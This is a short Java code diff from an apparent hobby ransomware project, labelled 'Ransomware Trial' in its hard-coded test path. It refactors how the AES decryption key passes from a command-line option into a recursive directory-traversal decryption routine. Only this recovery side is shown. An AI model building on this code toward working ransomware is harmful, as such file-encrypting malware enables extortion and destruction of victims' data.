@@ -15,6 +15,7 @@ class App {
 
     private static String PATH;
     private static HashSet<String> CURR_OS_EXCLUDED_FOLDERS;
+    private static SecretKey DECRYPTION_KEY;
 
     public static void main(String[] args) {
         PATH = "C:\\Users\\termi\\Desktop\\Ransomware Trial\\Fullstack-Auction-Website";
@@ -42,7 +43,7 @@ class App {
         }
     }
 
-    public static void traverseAndDecrypt(File[] files, SecretKey key) {
+    public static void traverseAndDecrypt(File[] files) {
         if (files == null) {
             return;
         }
@@ -50,10 +51,10 @@ class App {
         for (File file : files) {
             if (file.isDirectory()) {
                 if (!CURR_OS_EXCLUDED_FOLDERS.contains(file.getName().toLowerCase())) {
-                    traverseAndDecrypt(file.listFiles(), key);
+                    traverseAndDecrypt(file.listFiles());
                 }
             } else {
-                Decrypter decrypter = new Decrypter(file.toPath());
+                Decrypter decrypter = new Decrypter(file.toPath(), DECRYPTION_KEY);
                 decrypter.startDecryption();
             }
         }
@@ -109,8 +110,8 @@ class App {
 
             if (cmd.hasOption("decrypt")) {
                 String stringKey = cmd.getOptionValue("decrypt");
-                SecretKey key = new SecretKeySpec(stringKey.getBytes(StandardCharsets.UTF_8), "AES");
-                traverseAndDecrypt(new File(PATH).listFiles(), key);
+                DECRYPTION_KEY = new SecretKeySpec(stringKey.getBytes(StandardCharsets.UTF_8), "AES");
+                traverseAndDecrypt(new File(PATH).listFiles());
                 return;
             }
 
